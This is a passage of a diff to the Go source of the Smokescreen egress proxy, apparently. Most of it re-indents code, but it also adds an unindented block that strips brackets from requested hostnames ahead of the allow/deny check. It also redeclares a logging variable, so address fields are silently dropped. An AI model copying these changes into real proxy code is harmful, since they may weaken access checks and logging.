sctx.cfg.IdleTimeout)\n-\t}\n-\n-\treturn conn, nil\n+        pctx, ok := proxyContext(ctx)\n+        if !ok {\n+                return nil, fmt.Errorf(\"dialContext missing required *goproxy.ProxyCtx\")\n+        }\n+\n+        sctx, ok := pctx.UserData.(*smokescreenContext)\n+        if !ok {\n+                return nil, fmt.Errorf(\"dialContext missing required *smokescreenContext\")\n+        }\n+        d := sctx.decision\n+\n+        // If an address hasn't been resolved, does not match the original outboundHost,\n+        // or is not tcp we must re-resolve it before establishing the connection.\n+        if d.resolvedAddr == nil || d.outboundHost != addr || network != \"tcp\" {\n+                var err error\n+                d.resolvedAddr, d.reason, err = safeResolve(sctx.cfg, network, addr)\n+                if err != nil {\n+                        if _, ok := err.(denyError); ok {\n+                                sctx.cfg.Log.WithFields(\n+                                        logrus.Fields{\n+                                                \"address\": addr,\n+                                                \"error\":   err,\n+                                        }).Error(\"unexpected illegal address in dialer\")\n+                        }\n+                        return nil, err\n+                }\n+        }\n+\n+        var conn net.Conn\n+        var err error\n+\n+        start := time.Now()\n+        if sctx.cfg.ProxyDialTimeout == nil {\n+                conn, err = net.DialTimeout(network, d.resolvedAddr.String(), sctx.cfg.ConnectTimeout)\n+        } else {\n+                conn, err = sctx.cfg.ProxyDialTimeout(ctx, network, d.resolvedAddr.String(), sctx.cfg.ConnectTimeout)\n+        }\n+        connTime := time.Since(start)\n+\n+        fields := logrus.Fields{\n+                LogFieldConnEstablishMS: connTime.Milliseconds(),\n+        }\n+\n+        if sctx.cfg.TimeConnect {\n+                domainTag := fmt.Sprintf(\"domain:%s\", sctx.requestedHost)\n+                sctx.cfg.MetricsClient.TimingWithTags(\"cn.atpt.connect.time\", connTime, 1, []string{domainTag})\n+        }\n+\n+        if err != nil {\n+                sctx.cfg.MetricsClient.IncrWithTags(\"cn.atpt.total\", []string{\"success:false\"}, 1)\n+                return nil, err\n+        }\n+        sctx.cfg.MetricsClient.IncrWithTags(\"cn.atpt.total\", []string{\"success:true\"}, 1)\n+\n+        if conn != nil {\n+                fields := logrus.Fields{}\n+\n+                if addr := conn.LocalAddr(); addr != nil {\n+                        fields[LogFieldOutLocalAddr] = addr.String()\n+                }\n+\n+                if addr := conn.RemoteAddr(); addr != nil {\n+                        fields[LogFieldOutRemoteAddr] = addr.String()\n+                }\n+\n+        }\n+        sctx.logger = sctx.logger.WithFields(fields)\n+\n+        // Only wrap CONNECT conns with an InstrumentedConn. Connections used for traditional HTTP proxy\n+        // requests are pooled and reused by net.Transport.\n+        if sctx.proxyType == connectProxy {\n+                ic := sctx.cfg.ConnTracker.NewInstrumentedConnWithTimeout(conn, sctx.cfg.IdleTimeout, sctx.logger, d.role, d.outboundHost, sctx.proxyType)\n+                pctx.ConnErrorHandler = ic.Error\n+                conn = ic\n+        } else {\n+                conn = NewTimeoutConn(conn, sctx.cfg.IdleTimeout)\n+        }\n+\n+        return conn, nil\n }\n \n // HTTPErrorHandler allows returning a custom error response when smokescreen\n // fails to connect to the proxy target.\n func HTTPErrorHandler(w io.WriteCloser, pctx *goproxy.ProxyCtx, err error) {\n-\tsctx := pctx.UserData.(*smokescreenContext)\n-\tresp := rejectResponse(pctx, err)\n+        sctx := pctx.UserData.(*smokescreenContext)\n+        resp := rejectResponse(pctx, err)\n \n-\tif err := resp.Write(w); err != nil {\n-\t\tsctx.logger.Errorf(\"Failed to write HTTP error response: %s\", err)\n-\t}\n+        if err := resp.Write(w); err != nil {\n+                sctx.logger.Errorf(\"Failed to write HTTP error response: %s\", err)\n+        }\n \n-\tif err := w.Close(); err != nil {\n-\t\tsctx.logger.Errorf(\"Failed to close proxy client connection: %s\", err)\n-\t}\n+        if err := w.Close(); err != nil {\n+                sctx.logger.Errorf(\"Failed to close proxy client connection: %s\", err)\n+        }\n }\n \n func rejectResponse(pctx *goproxy.ProxyCtx, err error) *http.Response {\n-\tsctx := pctx.UserData.(*smokescreenContext)\n-\n-\tvar msg, status string\n-\tvar code int\n-\n-\tif e, ok := err.(net.Error); ok {\n-\t\t// net.Dial timeout\n-\t\tif e.Timeout() {\n-\t\t\tstatus = \"Gateway timeout\"\n-\t\t\tcode = http.StatusGatewayTimeout\n-\t\t\tmsg = \"Timed out connecting to remote host: \" + e.Error()\n-\t\t} else {\n-\t\t\tstatus = \"Bad gateway\"\n-\t\t\tcode = http.StatusBadGateway\n-\t\t\tmsg = \"Failed to connect to remote host: \" + e.Error()\n-\t\t}\n-\t} else if e, ok := err.(denyError); ok {\n-\t\tstatus = \"Request rejected by proxy\"\n-\t\tcode = http.StatusProxyAuthRequired\n-\t\tmsg = fmt.Sprintf(denyMsgTmpl, pctx.Req.Host, e.Error())\n-\t} else {\n-\t\tstatus = \"Internal server error\"\n-\t\tcode = http.StatusInternalServerError\n-\t\tmsg = \"An unexpected error occurred: \" + err.Error()\n-\t\tsctx.logger.WithField(\"error\", err.Error()).Warn(\"rejectResponse called with unexpected error\")\n-\t}\n-\n-\t// Do not double log deny errors, they are logged in a previous call to logProxy.\n-\tif _, ok := err.(denyError); !ok {\n-\t\tsctx.logger.Error(msg)\n-\t}\n-\n-\tif sctx.cfg.AdditionalErrorMessageOnDeny != \"\" {\n-\t\tmsg = fmt.Sprintf(\"%s\\n\\n%s\\n\", msg, sctx.cfg.AdditionalErrorMessageOnDeny)\n-\t}\n-\n-\tresp := goproxy.NewResponse(pctx.Req, goproxy.ContentTypeText, code, msg+\"\\n\")\n-\tresp.Status = status\n-\tresp.ProtoMajor = pctx.Req.ProtoMajor\n-\tresp.ProtoMinor = pctx.Req.ProtoMinor\n-\tresp.Header.Set(errorHeader, msg)\n-\tif sctx.cfg.RejectResponseHandler != nil {\n-\t\tsctx.cfg.RejectResponseHandler(resp)\n-\t}\n-\treturn resp\n+        sctx := pctx.UserData.(*smokescreenContext)\n+\n+        var msg, status string\n+        var code int\n+\n+        if e, ok := err.(net.Error); ok {\n+                // net.Dial timeout\n+                if e.Timeout() {\n+                        status = \"Gateway timeout\"\n+                        code = http.StatusGatewayTimeout\n+                        msg = \"Timed out connecting to remote host: \" + e.Error()\n+                } else {\n+                        status = \"Bad gateway\"\n+                        code = http.StatusBadGateway\n+                        msg = \"Failed to connect to remote host: \" + e.Error()\n+                }\n+        } else if e, ok := err.(denyError); ok {\n+                status = \"Request rejected by proxy\"\n+                code = http.StatusProxyAuthRequired\n+                msg = fmt.Sprintf(denyMsgTmpl, pctx.Req.Host, e.Error())\n+        } else {\n+                status = \"Internal server error\"\n+                code = http.StatusInternalServerError\n+                msg = \"An unexpected error occurred: \" + err.Error()\n+                sctx.logger.WithField(\"error\", err.Error()).Warn(\"rejectResponse called with unexpected error\")\n+        }\n+\n+        // Do not double log deny errors, they are logged in a previous call to logProxy.\n+        if _, ok := err.(denyError); !ok {\n+                sctx.logger.Error(msg)\n+        }\n+\n+        if sctx.cfg.AdditionalErrorMessageOnDeny != \"\" {\n+                msg = fmt.Sprintf(\"%s\\n\\n%s\\n\", msg, sctx.cfg.AdditionalErrorMessageOnDeny)\n+        }\n+\n+        resp := goproxy.NewResponse(pctx.Req, goproxy.ContentTypeText, code, msg+\"\\n\")\n+        resp.Status = status\n+        resp.ProtoMajor = pctx.Req.ProtoMajor\n+        resp.ProtoMinor = pctx.Req.ProtoMinor\n+        resp.Header.Set(errorHeader, msg)\n+        if sctx.cfg.RejectResponseHandler != nil {\n+                sctx.cfg.RejectResponseHandler(resp)\n+        }\n+        return resp\n }\n \n func configureTransport(tr *http.Transport, cfg *Config) {\n-\tif cfg.TransportMaxIdleConns != 0 {\n-\t\ttr.MaxIdleConns = cfg.TransportMaxIdleConns\n-\t}\n+        if cfg.TransportMaxIdleConns != 0 {\n+                tr.MaxIdleConns = cfg.TransportMaxIdleConns\n+        }\n \n-\tif cfg.TransportMaxIdleConnsPerHost != 0 {\n-\t\ttr.MaxIdleConnsPerHost = cfg.TransportMaxIdleConns\n-\t}\n+        if cfg.TransportMaxIdleConnsPerHost != 0 {\n+                tr.MaxIdleConnsPerHost = cfg.TransportMaxIdleConns\n+        }\n \n-\tif cfg.IdleTimeout != 0 {\n-\t\ttr.IdleConnTimeout = cfg.IdleTimeout\n-\t}\n+        if cfg.IdleTimeout != 0 {\n+                tr.IdleConnTimeout = cfg.IdleTimeout\n+        }\n }\n \n func newContext(cfg *Config, proxyType string, req *http.Request) *smokescreenContext {\n-\tstart := time.Now()\n-\n-\tlogger := cfg.Log.WithFields(logrus.Fields{\n-\t\tLogFieldID:            xid.New().String(),\n-\t\tLogFieldInRemoteAddr:  req.RemoteAddr,\n-\t\tLogFieldProxyType:     proxyType,\n-\t\tLogFieldRequestedHost: req.Host,\n-\t\tLogFieldStartTime:     start.UTC(),\n-\t\tLogFieldTraceID:       req.Header.Get(traceHeader),\n-\t})\n-\n-\treturn &smokescreenContext{\n-\t\tcfg:           cfg,\n-\t\tlogger:        logger,\n-\t\tproxyType:     proxyType,\n-\t\tstart:         start,\n-\t\trequestedHost: req.Host,\n-\t}\n+        start := time.Now()\n+\n+        logger := cfg.Log.WithFields(logrus.Fields{\n+                LogFieldID:            xid.New().String(),\n+                LogFieldInRemoteAddr:  req.RemoteAddr,\n+                LogFieldProxyType:     proxyType,\n+                LogFieldRequestedHost: req.Host,\n+                LogFieldStartTime:     start.UTC(),\n+                LogFieldTraceID:       req.Header.Get(traceHeader),\n+        })\n+\n+        return &smokescreenContext{\n+                cfg:           cfg,\n+                logger:        logger,\n+                proxyType:     proxyType,\n+                start:         start,\n+                requestedHost: req.Host,\n+        }\n }\n \n func BuildProxy(config *Config) *goproxy.ProxyHttpServer {\n-\tproxy := goproxy.NewProxyHttpServer()\n-\tproxy.Verbose = false\n-\tconfigureTransport(proxy.Tr, config)\n-\n-\t// dialContext will be invoked for both CONNECT and traditional proxy requests\n-\tproxy.Tr.DialContext = dialContext\n-\n-\t// Use a custom goproxy.RoundTripperFunc to ensure that the correct context is attached to the request.\n-\t// This is only used for non-CONNECT HTTP proxy requests. For connect requests, goproxy automatically\n-\t// attaches goproxy.ProxyCtx prior to calling dialContext.\n-\trtFn := goproxy.RoundTripperFunc(func(req *http.Request, pctx *goproxy.ProxyCtx) (*http.Response, error) {\n-\t\tctx := context.WithValue(req.Context(), goproxy.ProxyContextKey, pctx)\n-\t\treturn proxy.Tr.RoundTrip(req.WithContext(ctx))\n-\t})\n-\n-\t// Associate a timeout with the CONNECT proxy client connection\n-\tif config.IdleTimeout != 0 {\n-\t\tproxy.ConnectClientConnHandler = func(conn net.Conn) net.Conn {\n-\t\t\treturn NewTimeoutConn(conn, config.IdleTimeout)\n-\t\t}\n-\t}\n-\n-\t// Handle traditional HTTP proxy\n-\tproxy.OnRequest().DoFunc(func(req *http.Request, pctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {\n-\n-\t\t// We are intentionally *not* setting pctx.HTTPErrorHandler because with traditional HTTP\n-\t\t// proxy requests we are able to specify the request during the call to OnResponse().\n-\t\tsctx := newContext(config, httpProxy, req)\n-\n-\t\t// Attach smokescreenContext to goproxy.ProxyCtx\n-\t\tpctx.UserData = sctx\n-\n-\t\t// Delete Smokescreen specific headers before goproxy forwards the request\n-\t\tdefer func() {\n-\t\t\treq.Header.Del(roleHeader)\n-\t\t\treq.Header.Del(traceHeader)\n-\t\t}()\n-\n-\t\t// Set this on every request as every request mints a new goproxy.ProxyCtx\n-\t\tpctx.RoundTripper = rtFn\n-\n-\t\t// Build an address parsable by net.ResolveTCPAddr\n-\t\tremoteHost := req.Host\n-\t\tif strings.LastIndex(remoteHost, \":\") <= strings.LastIndex(remoteHost, \"]\") {\n-\t\t\tswitch req.URL.Scheme {\n-\t\t\tcase \"http\":\n-\t\t\t\tremoteHost = net.JoinHostPort(remoteHost, \"80\")\n-\t\t\tcase \"https\":\n-\t\t\t\tremoteHost = net.JoinHostPort(remoteHost, \"443\")\n-\t\t\tdefault:\n-\t\t\t\tremoteHost = net.JoinHostPort(remoteHost, \"0\")\n-\t\t\t}\n-\t\t}\n-\n-\t\tsctx.logger.WithField(\"url\", req.RequestURI).Debug(\"received HTTP proxy request\")\n-\n-\t\tsctx.decision, sctx.lookupTime, pctx.Error = checkIfRequestShouldBeProxied(config, req, remoteHost)\n-\n-\t\t// Returning any kind of response in this handler is goproxy's way of short circuiting\n-\t\t// the request. The original request will never be sent, and goproxy will invoke our\n-\t\t// response filter attached via the OnResponse() handler.\n-\t\tif pctx.Error != nil {\n-\t\t\treturn req, rejectResponse(pctx, pctx.Error)\n-\t\t}\n-\t\tif !sctx.decision.allow {\n-\t\t\treturn req, rejectResponse(pctx, denyError{errors.New(sctx.decision.reason)})\n-\t\t}\n-\n-\t\t// Proceed with proxying the request\n-\t\treturn req, nil\n-\t})\n-\n-\t// Handle CONNECT proxy to TLS & other TCP protocols destination\n-\tproxy.OnRequest().HandleConnectFunc(func(host string, pctx *goproxy.ProxyCtx) (*goproxy.ConnectAction, string) {\n-\t\tpctx.UserData = newContext(config, connectProxy, pctx.Req)\n-\t\tpctx.HTTPErrorHandler = HTTPErrorHandler\n-\n-\t\t// Defer logging the proxy event here because logProxy relies\n-\t\t// on state set in handleConnect\n-\t\tdefer logProxy(config, pctx)\n-\t\tdefer pctx.Req.Header.Del(traceHeader)\n-\n-\t\terr := handleConnect(config, pctx)\n-\t\tif err != nil {\n-\t\t\tpctx.Resp = rejectResponse(pctx, err)\n-\t\t\treturn goproxy.RejectConnect, \"\"\n-\t\t}\n-\t\treturn goproxy.OkConnect, host\n-\t})\n-\n-\t// Strangely, goproxy can invoke this same function twice for a single HTTP request.\n-\t//\n-\t// If a proxy request is rejected due to an ACL denial, the response passed to this\n-\t// function was created by Smokescreen's call to rejectResponse() in the OnRequest()\n-\t// handler. This only happens once. This is also the behavior for an allowed request\n-\t// which is completed successfully.\n-\t//\n-\t// If a proxy request is allowed, but the RoundTripper returns an error fulfulling\n-\t// the HTTP request, goproxy will invoke this OnResponse() filter twice. First this\n-\t// function will be called with a nil response, and as a result this function will\n-\t// return a response to send back to the proxy client using rejectResponse(). This\n-\t// function will be called again with the previously returned response, which will\n-\t// simply trigger the logHTTP function and return.\n-\tproxy.OnResponse().DoFunc(func(resp *http.Response, pctx *goproxy.ProxyCtx) *http.Response {\n-\t\tsctx := pctx.UserData.(*smokescreenContext)\n-\n-\t\tif resp != nil && resp.Header.Get(errorHeader) != \"\" {\n-\t\t\tif pctx.Error == nil && sctx.decision.allow {\n-\t\t\t\tresp.Header.Del(errorHeader)\n-\t\t\t}\n-\t\t}\n-\n-\t\tif resp == nil && pctx.Error != nil {\n-\t\t\treturn rejectResponse(pctx, pctx.Error)\n-\t\t}\n-\n-\t\t// In case of an error, this function is called a second time to filter the\n-\t\t// response we generate so this logger will be called once.\n-\t\tlogProxy(config, pctx)\n-\t\treturn resp\n-\t})\n-\treturn proxy\n+        proxy := goproxy.NewProxyHttpServer()\n+        proxy.Verbose = false\n+        configureTransport(proxy.Tr, config)\n+\n+        // dialContext will be invoked for both CONNECT and traditional proxy requests\n+        proxy.Tr.DialContext = dialContext\n+\n+        // Use a custom goproxy.RoundTripperFunc to ensure that the correct context is attached to the request.\n+        // This is only used for non-CONNECT HTTP proxy requests. For connect requests, goproxy automatically\n+        // attaches goproxy.ProxyCtx prior to calling dialContext.\n+        rtFn := goproxy.RoundTripperFunc(func(req *http.Request, pctx *goproxy.ProxyCtx) (*http.Response, error) {\n+                ctx := context.WithValue(req.Context(), goproxy.ProxyContextKey, pctx)\n+                return proxy.Tr.RoundTrip(req.WithContext(ctx))\n+        })\n+\n+        // Associate a timeout with the CONNECT proxy client connection\n+        if config.IdleTimeout != 0 {\n+                proxy.ConnectClientConnHandler = func(conn net.Conn) net.Conn {\n+                        return NewTimeoutConn(conn, config.IdleTimeout)\n+                }\n+        }\n+\n+        // Handle traditional HTTP proxy\n+        proxy.OnRequest().DoFunc(func(req *http.Request, pctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {\n+\n+                // We are intentionally *not* setting pctx.HTTPErrorHandler because with traditional HTTP\n+                // proxy requests we are able to specify the request during the call to OnResponse().\n+                sctx := newContext(config, httpProxy, req)\n+\n+                // Attach smokescreenContext to goproxy.ProxyCtx\n+                pctx.UserData = sctx\n+\n+                // Delete Smokescreen specific headers before goproxy forwards the request\n+                defer func() {\n+                        req.Header.Del(roleHeader)\n+                        req.Header.Del(traceHeader)\n+                }()\n+\n+                // Set this on every request as every request mints a new goproxy.ProxyCtx\n+                pctx.RoundTripper = rtFn\n+\n+                // Build an address parsable by net.ResolveTCPAddr\n+                remoteHost := req.Host\n+// Strip brackets from host if it's not an IP address\n+if len(remoteHost) > 1 && remoteHost[0] == '[' && remoteHost[len(remoteHost)-1] == ']' {\n+if ip := net.ParseIP(remoteHost[1:len(remoteHost)-1]); ip == nil {\n+remoteHost = remoteHost[1:len(remoteHost)-1]\n+}\n+}\n+                if strings.LastIndex(remoteHost, \":\") <= strings.LastIndex(remoteHost, \"]\") {\n+                        switch req.URL.Scheme {\n+                        case \"http\":\n+                                remoteHost = net.JoinHostPort(remoteHost, \"80\")\n+                        case \"https\":\n+                                remoteHost = net.JoinHostPort(remoteHost, \"443\")\n+                        default:\n+                                remoteHost = net.JoinHostPort(remoteHost, \"0\")\n+                        }\n+                }\n+\n+                sctx.logger.WithField(\"url\", req.RequestURI).Debug(\"received HTTP proxy request\")\n+\n+                sctx.decision, sctx.lookupTime, pctx.Error = checkIfRequestShouldBeProxied(config, req, remoteHost)\n+\n+                // Returning any kind of response in this handler is goproxy's way of short circuiting\n+                // the request. The original request will never be sent, and goproxy will invoke our\n+                // response filter attached via the OnResponse() handler.\n+                if pctx.Error != nil {\n+                        return req, rejectResponse(pctx, pctx.Error)\n+                }\n+                if !sctx.decision.allow {\n+                        return req, rejectResponse(pctx, denyError{errors.New(sctx.decision.reason)})\n+                }\n+\n+                // Proceed with proxying the request\n+                return req, nil\n+        })\n+\n+        // Handle CONNECT proxy to TLS & other TCP protocols destination\n+        proxy.OnRequest().HandleConnectFunc(func(host string, pctx *goproxy.ProxyCtx) (*goproxy.ConnectAction, string) {\n+                pctx.UserData = newContext(config, connectProxy, pctx.Req)\n+                pctx.HTTPErrorHandler = HTTPErrorHandler\n+\n+                // Defer logging the proxy event here because logProxy relies\n+                // on state set in handleConnect\n+                defer logProxy(config, pctx)\n+                defer pctx.Req.Header.Del(traceHeader)\n+\n+                err := handleConnect(config, pctx)\n+                if err != nil {\n+                        pctx.Resp = rejectResponse(pctx, err)\n+                        return goproxy.RejectConnect, \"\"\n+                }\n+                return goproxy.OkConnect, host\n+        })\n+\n+        // Strangely, goproxy can invoke this same function twice for a single HTTP request.\n+        //\n+        // If a proxy request is rejected due to an ACL denial, the response passed to this\n+        // function was created by Smokescreen's call to rejectResponse() in the OnRequest()\n+        // handler. This only happens once. This is also the behavior for an allowed request\n+        // which is completed successfully.\n+        //\n+        // If a proxy request is allowed, but the RoundTripper returns an error fulfulling\n+        // the HTTP request, goproxy will invoke this OnResponse() filter twice. First this\n+        // function will be called with a nil response, and as a result this function will\n+        // return a response to send back to the proxy client using rejectResponse(). This\n+        // function will be called again with the previously returned response, which will\n+        // simply trigger the logHTTP function and return.\n+        proxy.OnResponse().DoFunc(func(resp *http.Response, pctx *goproxy.ProxyCtx) *http.Response {\n+                sctx := pctx.UserData.(*smokescreenContext)\n+\n+                if resp != nil && resp.Header.Get(errorHeader) != \"\" {\n+                        if pctx.Error == nil && sctx.decision.allow {\n+                                resp.Header.Del(errorHeader)\n+                        }\n+                }\n+\n+                if resp == nil && pctx.Error != nil {\n+                        return rejectResponse(pctx, pctx.Error)\n+                }\n+\n+                // In case of an error, this function is called a second time to filter the\n+                // response we generate so this logger will be called once.\n+                logProxy(config, pctx)\n+                return resp\n+        })\n+        return proxy\n }\n \n func logProxy(config *Config, pctx *goproxy.ProxyCtx) {\n-\tsctx := pctx.UserData.(*smokescreenContext)\n-\n-\tfields := logrus.Fields{}\n-\n-\t// attempt to retrieve information about the host originating the proxy request\n-\tif pctx.Req.TLS != nil && len(pctx.Req.TLS.PeerCertificates) > 0 {\n-\t\tfields[LogFieldInRemoteX509CN] = pctx.Req.TLS.PeerCertificates[0].Subject.CommonName\n-\t\tvar ouEntries = pctx.Req.TLS.PeerCertificates[0].Subject.OrganizationalUnit\n-\t\tif len(ouEntries) > 0 {\n-\t\t\tfields[LogFieldInRemoteX509OU] = ouEntries[0]\n-\t\t}\n-\t}\n-\n-\tdecision := sctx.decision\n-\tif sctx.decision != nil {\n-\t\tfields[LogFieldRole] = decision.role\n-\t\tfields[LogFieldProject] = decision.project\n-\t}\n-\n-\t// add the above fields to all future log messages sent using this smokescreen context's logger\n-\tsctx.logger = sctx.logger.WithFields(fields)\n-\n-\t// start a new set of fields used only in this log message\n-\tfields = logrus.Fields{}\n-\n-\t// If a lookup takes less than 1ms it will be rounded down to zero. This can separated from\n-\t// actual failures where the default zero value will also have the error field set.\n-\tfields[LogFieldDNSLookupTime] = sctx.lookupTime.Milliseconds()\n-\n-\tif pctx.Resp != nil {\n-\t\tfields[LogFieldContentLength] = pctx.Resp.ContentLength\n-\t}\n-\n-\tif sctx.decision != nil {\n-\t\tfields[LogFieldDecisionReason] = decision.reason\n-\t\tfields[LogFieldEnforceWouldDeny] = decision.enforceWouldDeny\n-\t\tfields[LogFieldAllow] = decision.allow\n-\t}\n-\n-\terr := pctx.Error\n-\tif err != nil {\n-\t\tfields[LogFieldError] = err.Error()\n-\t}\n-\n-\tentry := sctx.logger.WithFields(fields)\n-\tvar logMethod func(...interface{})\n-\tif _, ok := err.(denyError); !ok && err != nil {\n-\t\tlogMethod = entry.Error\n-\t} else if decision != nil && decision.allow {\n-\t\tlogMethod = entry.Info\n-\t} else {\n-\t\tlogMethod = entry.Warn\n-\t}\n-\tlogMethod(CanonicalProxyDecision)\n+        sctx := pctx.UserData.(*smokescreenContext)\n+\n+        fields := logrus.Fields{}\n+\n+        // attempt to retrieve information about the host originating the proxy request\n+        if pctx.Req.TLS != nil && len(pctx.Req.TLS.PeerCertificates) > 0 {\n+                fields[LogFieldInRemoteX509CN] = pctx.Req.TLS.PeerCertificates[0].Subject.CommonName\n+                var ouEntries = pctx.Req.TLS.PeerCertificates[0].Subject.OrganizationalUnit\n+                if len(ouEntries) > 0 {\n+                        fields[LogFieldInRemoteX509OU] = ouEntries[0]\n+                }\n+        }\n+\n+        decision := sctx.decision\n+        if sctx.decision != nil {\n+                fields[LogFieldRole] = decision.role\n+                fields[LogFieldProject] = decision.project\n+        }\n+\n+        // add the above fields to all future log messages sent using this smokescreen context's logger\n+        sctx.logger = sctx.logger.WithFields(fields)\n+\n+        // start a new set of fields used only in this log message\n+        fields = logrus.Fields{}\n+\n+        // If a lookup takes less than 1ms it will be rounded down to zero. This can separated from\n+        // actual failures where the default zero value will also have the error field set.\n+        fields[LogFieldDNSLookupTime] = sctx.lookupTime.Milliseconds()\n+\n+        if pctx.Resp != nil {\n+                fields[LogFieldContentLength] = pctx.Resp.ContentLength\n+        }\n+\n+        if sctx.decision != nil {\n+                fields[LogFieldDecisionReason] = decision.reason\n+                fields[LogFieldEnforceWouldDeny] = decision.enforceWouldDeny\n+                fields[LogFieldAllow] = decision.allow\n+        }\n+\n+        err := pctx.Error\n+        if err != nil {\n+                fields[LogFieldError] = err.Error()\n+        }\n+\n+        entry := sctx.logger.WithFields(fields)\n+        var logMethod func(...interface{})\n+        if _, ok := err.(denyError); !ok && err != nil {\n+                logMethod = entry.Error\n+        } else if decision != nil && decision.allow {\n+                logMethod = entry.Info\n+        } else {\n+                logMethod = entry.Warn\n+        }\n+        logMethod(CanonicalProxyDecision)\n }\n \n func handleConnect(config *Config, pctx *goproxy.ProxyCtx) error {\n-\tsctx := pctx.UserData.(*smokescreenContext)\n-\n-\t// Check if requesting role is allowed to talk to remote\n-\tsctx.decision, sctx.lookupTime, pctx.Error = checkIfRequestShouldBeProxied(config, pctx.Req, pctx.Req.Host)\n-\tif pctx.Error != nil {\n-\t\treturn pctx.Error\n-\t}\n-\tif !sctx.decision.allow {\n-\t\treturn denyError{errors.New(sctx.decision.reason)}\n-\t}\n-\n-\treturn nil\n+        sctx := pctx.UserData.(*smokescreenContext)\n+\n+        // Check if requesting role is allowed to talk to remote\n+        sctx.decision, sctx.lookupTime, pctx.Error = checkIfRequestShouldBeProxied(config, pctx.Req, pctx.Req.Host)\n+        if pctx.Error != nil {\n+                return pctx.Error\n+        }\n+        if !sctx.decision.allow {\n+                return denyError{errors.New(sctx.decision.reason)}\n+        }\n+\n+        return nil\n }\n \n func findListener(ip string, defaultPort uint16) (net.Listener, error) {\n-\tif einhorn.IsWorker() {\n-\t\tlistener, err := einhorn.GetListener(0)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\treturn &einhornListener{Listener: listener}, err\n-\t} else {\n-\t\treturn net.Listen(\"tcp\", fmt.Sprintf(\"%s:%d\", ip, defaultPort))\n-\t}\n+        if einhorn.IsWorker() {\n+                listener, err := einhorn.GetListener(0)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                return &einhornListener{Listener: listener}, err\n+        } else {\n+                return net.Listen(\"tcp\", fmt.Sprintf(\"%s:%d\", ip, defaultPort))\n+        }\n }\n \n func StartWithConfig(config *Config, quit <-chan interface{}) {\n-\tconfig.Log.Println(\"starting\")\n-\tproxy := BuildProxy(config)\n-\tlistener := config.Listener\n-\tvar err error\n-\n-\tif listener == nil {\n-\t\tlistener, err = findListener(config.Ip, config.Port)\n-\t\tif err != nil {\n-\t\t\tconfig.Log.Fatal(\"can't find listener\", err)\n-\t\t}\n-\t}\n-\n-\tif config.SupportProxyProtocol {\n-\t\tlistener = &proxyproto.Listener{Listener: listener}\n-\t}\n-\n-\tvar handler http.Handler = proxy\n-\n-\tif config.Healthcheck != nil {\n-\t\thandler = &HealthcheckMiddleware{\n-\t\t\tProxy:       handler,\n-\t\t\tHealthcheck: config.Healthcheck,\n-\t\t}\n-\t}\n-\n-\t// TLS support\n-\tif config.TlsConfig != nil {\n-\t\tlistener = tls.NewListener(listener, config.TlsConfig)\n-\t}\n-\n-\t// Setup connection tracking\n-\tconfig.ConnTracker = conntrack.NewTracker(config.IdleTimeout, config.MetricsClient.StatsdClient, config.Log, config.ShuttingDown)\n-\n-\tserver := http.Server{\n-\t\tHandler: handler,\n-\t}\n-\n-\t// This sets an IdleTimeout on _all_ client connections. CONNECT requests\n-\t// hijacked by goproxy inherit the deadline set here. The deadlines are\n-\t// reset by the proxy.ConnectClientConnHandler, which wraps the hijacked\n-\t// connection in a TimeoutConn which bumps the deadline for every read/write.\n-\tif config.IdleTimeout != 0 {\n-\t\tserver.IdleTimeout = config.IdleTimeout\n-\t}\n-\n-\tconfig.MetricsClient.started.Store(true)\n-\tconfig.ShuttingDown.Store(false)\n-\trunServer(config, &server, listener, quit)\n+        config.Log.Println(\"starting\")\n+        proxy := BuildProxy(config)\n+        listener := config.Listener\n+        var err error\n+\n+        if listener == nil {\n+                listener, err = findListener(config.Ip, config.Port)\n+                if err != nil {\n+                        config.Log.Fatal(\"can't find listener\", err)\n+                }\n+        }\n+\n+        if config.SupportProxyProtocol {\n+                listener = &proxyproto.Listener{Listener: listener}\n+        }\n+\n+        var handler http.Handler = proxy\n+\n+        if config.Healthcheck != nil {\n+                handler = &HealthcheckMiddleware{\n+                        Proxy:       handler,\n+                        Healthcheck: config.Healthcheck,\n+                }\n+        }\n+\n+        // TLS support\n+        if config.TlsConfig != nil {\n+                listener = tls.NewListener(listener, config.TlsConfig)\n+        }\n+\n+        // Setup connection tracking\n+        config.ConnTracker = conntrack.NewTracker(config.IdleTimeout, config.MetricsClient.StatsdClient, config.Log, config.ShuttingDown)\n+\n+        server := http.Server{\n+                Handler: handler,\n+        }\n+\n+        // This sets an IdleTimeout on _all_ client connections. CONNECT requests\n+        // hijacked by goproxy inherit the deadline set here. The deadlines are\n+        // reset by the proxy.ConnectClientConnHandler, which wraps the hijacked\n+        // connection in a TimeoutConn which bumps the deadline for every read/write.\n+        if config.IdleTimeout != 0 {\n+                server.IdleTimeout = config.IdleTimeout\n+        }\n+\n+        config.MetricsClient.started.Store(true)\n+        config.ShuttingDown.Store(false)\n+        runServer(config, &server, listener, quit)\n }\n \n func runServer(config *Config, server *http.Server, listener net.Listener, quit <-chan interface{}) {\n-\t// Runs the server and shuts it down when it receives a signal.\n-\t//\n-\t// Why aren't we using goji's graceful shutdown library? Great question!\n-\t//\n-\t// There are several things we might want to do when shutting down gracefully:\n-\t// 1. close the listening socket (so that we don't accept *new* connections)\n-\t// 2. close *existing* keepalive connections once they become idle\n-\t//\n-\t// goproxy hijacks the socket and interferes with goji's ability to do the\n-\t// latter.  We instead pass InstrumentedConn objects, which wrap net.Conn,\n-\t// into goproxy.  ConnTracker keeps a reference to these, which allows us to\n-\t// know exactly how long to wait until the connection has become idle, and\n-\t// then Close it.\n-\n-\tif len(config.StatsSocketDir) > 0 {\n-\t\tconfig.StatsServer = StartStatsServer(config)\n-\t}\n-\n-\tgraceful := true\n-\tkill := make(chan os.Signal, 1)\n-\tsignal.Notify(kill, syscall.SIGUSR2, syscall.SIGTERM, syscall.SIGHUP)\n-\tgo func() {\n-\t\tselect {\n-\t\tcase <-kill:\n-\t\t\tconfig.Log.Print(\"quitting gracefully\")\n-\n-\t\tcase <-quit:\n-\t\t\tconfig.Log.Print(\"quitting now\")\n-\t\t\tgraceful = false\n-\t\t}\n-\t\tconfig.ShuttingDown.Store(true)\n-\n-\t\t// Shutdown() will block until all connections are closed unless we\n-\t\t// provide it with a cancellation context.\n-\t\ttimeout := config.ExitTimeout\n-\t\tif !graceful {\n-\t\t\ttimeout = 10 * 